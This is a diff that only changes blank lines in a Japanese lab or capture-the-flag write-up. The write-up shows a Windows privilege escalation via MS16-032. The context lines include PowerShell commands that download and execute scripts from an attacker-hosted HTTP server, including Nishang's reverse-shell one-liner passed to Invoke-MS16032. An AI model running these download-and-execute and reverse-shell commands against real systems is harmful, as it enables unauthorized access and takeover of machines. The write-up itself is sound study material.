@@ -86,13 +86,13 @@ Sherlock.ps1                                               100%[================
 
 2025-04-28 04:11:39 (8.72 MB/s) - ‘Sherlock.ps1’ saved [16663/16663]
 
-
 └─$ python3.13 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 `MS16-032`がエクスプロイトできそう
 ```powershell
 PS C:\Users\kostas\Desktop> iex(new-object net.webclient).downloadstring('http://10.10.16.3/Sherlock.ps1')
+
 PS C:\Users\kostas\Desktop> Find-AllVulns
 
 Title      : User Mode to Ring (KiTrap0D)
@@ -172,9 +172,7 @@ powreshellempireのPoCをKaliのwebサーバにアップロード
 ```sh
 └─$ cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/Invoke-MS16032.ps1 .
 
-
 └─$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 .
-
 
 └─$ python3.13 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
@@ -183,7 +181,6 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 エクスプロイト失敗
 ```powershell
 PS C:\Users\kostas\Desktop> IEX(new-object net.webclient).downloadstring('http://10.10.14.70/Invoke-MS16032.ps1')
-
 
 PS C:\Users\kostas\Desktop> Invoke-MS16032 -Command "IEX(new-object net.webclient).downloadstring('http://10.10.14.70/Invoke-PowerShellTcpOneLine.ps1')"
      __ __ ___ ___   ___     ___ ___ ___ 
@@ -230,7 +227,6 @@ True
 再度PoC実行、うまくいったぽい
 ```powershell
 PS C:\Users\kostas\Desktop> IEX(new-object net.webclient).downloadstring('http://10.10.14.70/Invoke-MS16032.ps1')
-
 
 PS C:\Users\kostas\Desktop> Invoke-MS16032 -Command "IEX(new-object net.webclient).downloadstring('http://10.10.14.70/Invoke-PowerShellTcpOneLine.ps1')"
      __ __ ___ ___   ___     ___ ___ ___ 
